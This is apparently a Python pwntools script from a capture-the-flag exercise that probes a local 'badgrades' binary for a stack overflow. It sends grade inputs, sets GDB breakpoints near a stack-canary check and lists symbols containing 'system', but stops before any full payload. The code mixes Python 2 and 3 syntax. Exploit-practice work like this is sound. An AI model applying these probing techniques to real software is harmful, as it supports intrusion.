#!/usr/bin/env python
from pwn import *
import time
# context.terminal = ["tmux", "splitw", "-h"]
#p = process("/media/sf_UBUNTU-18/PWNING/bamboofox/babystackbabystack")
binf = ELF("./badgrades_patched")
# libc=ELF("./libc-2.29.so")
libc=ELF.libc

#libc = ELF("libc-2.29.so")
#p = remote("chall.ctf.bamboofox.tw", 10102)
p=process('./badgrades_patched')

# your_grades: 0x401108
# call colores <400acb>: 0x401154
#   0x400ef9    mov    edi, 0x7f
#  0x400efe    call   alarm@plt <alarm@plt>
#break *0x401106
#break *0x401083
#* 0x401101                 call    ___stack_chk_fail
gs = '''
break *0x401101
'''



def start():
    if args.GDB:
        return gdb.debug(binf.path, gdbscript=gs)
    else:
        return process(binf.path)


context.log_level = "DEBUG"

def create_grades(n):
    p.sendlineafter(b"> ",b"2")
    p.sendlineafter(b"grades:",n)
    #p.sendlineafter(b":",str(str(1111.1111)))
    promedio=0
    for i in range(0,int(n)):
        if i==int(n)-1:
            pause()
        payload=i+0x41
        promedio=promedio+payload
        sleep(0.01)
        p.sendlineafter(b":",str(str(i+0x41)))
    print("promedio sin AAAA")
    print(promedio/int(n)+1)
    #p.sendlineafter(b":",str(str("AAAA")))
    #p.sendlineafter(b":",str(''))
    # p.sendline("AAdtrAAAAAA")

for key, address in binf.symbols.iteritems():
    if 'system' in key:
        print key, hex(address)



p=start()
create_grades(b"35")

#   0x400b55    lea    rax, [rbp - 0xb0]



p.interactive()
